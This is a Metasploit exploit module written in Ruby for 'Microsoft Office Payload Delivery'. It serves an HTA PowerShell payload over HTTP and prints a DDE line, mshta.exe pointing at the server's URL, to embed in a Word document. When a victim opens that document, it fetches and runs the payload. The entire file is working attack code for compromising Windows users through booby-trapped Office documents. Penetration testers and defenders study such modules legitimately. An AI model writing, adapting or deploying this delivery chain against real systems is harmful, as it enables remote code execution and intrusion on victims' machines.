##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule  < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info  = {})
    super(update_info(info,
      'Name' => 'Microsoft Office Payload Delivery',
      'Description' => %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },
      'License' => MSF_LICENSE,
      'Arch' => ARCH_X86,
      'Platform' => 'win',
      'Targets' =>
        [
          ['Automatic', {} ],
        ],
      'DefaultTarget' => 0,
    ))
  end

  def on_request_uri(cli, _request)
    print_status("Delivering payload")
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      'win',
      p.encoded,
      'hta-psh',
      { :arch => ARCH_X86, :platform => 'win '}
    )
    send_response(cli, data, 'Content-Type' => 'application/hta')
  end


  def primer
    url = get_uri
    print_status("Place the following DDE in an MS document:")
    print_line("mshta.exe \"#{url}\"")
  end
end

